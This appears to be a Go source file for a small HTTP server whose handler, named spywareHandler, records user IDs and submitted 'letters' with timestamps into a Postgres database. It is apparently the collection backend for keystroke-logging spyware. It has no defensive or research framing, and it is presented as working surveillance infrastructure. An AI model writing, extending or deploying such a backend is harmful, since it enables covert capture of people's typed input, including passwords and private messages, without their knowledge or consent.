package main

import (
	"github.com/go-pg/pg"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

var DBConnection *pg.DB

type Event struct {
	userId    string
	Letters   string
	Timestamp time.Time
}

func createDB() *pg.DB {
	url := os.Getenv("DATABASE_URL")
	url = strings.TrimPrefix(url, "postgres://")

	dbAt := strings.LastIndex(url, "/") + 1
	database := url[dbAt:]
	url = url[:dbAt-1]

	authAndHost := strings.Split(url, "@")
	auth := strings.Split(authAndHost[0], ":")
	username := auth[0]
	password := auth[1]
	hostAndPort := authAndHost[1]

	db := pg.Connect(&pg.Options{
		User:     username,
		Password: password,
		Database: database,
		Addr:     hostAndPort,
	})

	return db
}

func spywareHandler(w http.ResponseWriter, r *http.Request) {
	userId := r.FormValue("userId")
	letters := r.FormValue("letters")

	event := &Event{userId, letters, time.Now()}

	inErr := DBConnection.Insert(event)
	if inErr != nil {
		log.Println(inErr)
		return
	}
}

func main() {
	DBConnection = createDB()
	http.HandleFunc("/", spywareHandler)
	http.ListenAndServe(":8000", nil)
}
